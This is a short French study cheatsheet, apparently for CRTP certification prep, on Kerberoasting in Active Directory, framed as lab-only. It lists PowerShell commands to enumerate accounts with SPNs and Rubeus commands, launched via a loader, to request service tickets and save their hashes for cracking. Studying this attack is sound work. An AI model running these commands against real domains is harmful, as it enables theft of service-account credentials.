# Cheatsheet - Kerberoasting

> [!summary] Objectif
> Rappeler le déroulé de base pour identifier les comptes avec SPN et récupérer des tickets de service dans un lab CRTP.

> [!warning] Cadre d'utilisation
> À utiliser uniquement dans un environnement de lab autorisé, dans le cadre de l'apprentissage et de la préparation CRTP.

## Quand utiliser cette fiche

- Quand l'énumération révèle des comptes de service.
- Pour réviser les prérequis Kerberos étudiés dans le parcours CRTP.

## Prérequis

- Un compte de domaine du lab.
- Accès Kerberos au contrôleur de domaine.
- Un outillage autorisé de lab, par exemple PowerView ou Rubeus.

## Commandes

### Objectif

Identifier les comptes possédant un SPN.

### Commande

```powershell
Get-DomainUser -SPN
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```

### Explication

Ces commandes listent les comptes de service pouvant être étudiés dans un scénario de Kerberoasting.

### Contexte d’utilisation

À utiliser avant toute extraction de ticket pour vérifier les cibles pertinentes.

### Précautions

Comparer les résultats avec le contexte métier du lab avant de poursuivre.

### Objectif

Demander les tickets de service d'un compte ciblé.

### Commande

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args kerberoast /user:<USER> /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

### Explication

Suit le mode opératoire du lab avec `Loader.exe` et `Rubeus.exe` pour écrire une sortie exploitable pendant la révision.

### Contexte d’utilisation

Pertinent quand le lab prévoit une étape de recherche de mot de passe faible sur un compte de service.

### Précautions

Rester dans le cadre d'exercices autorisés et documenter le compte visé, le SPN et le résultat obtenu.

### Objectif

Évaluer la surface avant de cibler un compte.

### Commande

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args kerberoast /stats
```

### Explication

Affiche une vue statistique des comptes kerberoastables avant une demande de ticket ciblée.

### Contexte d’utilisation

Utile pour confirmer qu'une piste est intéressante dans le scénario du lab.

### Précautions

Commencer par une vue globale, puis documenter clairement le compte réellement étudié.

### Notes associées

- [[CheetSheet]]
- [[Enumeration]]
- [[Components of AD]]
- [[Synthèse - Kerberos]]
- [[Attaques AD - MOC]]
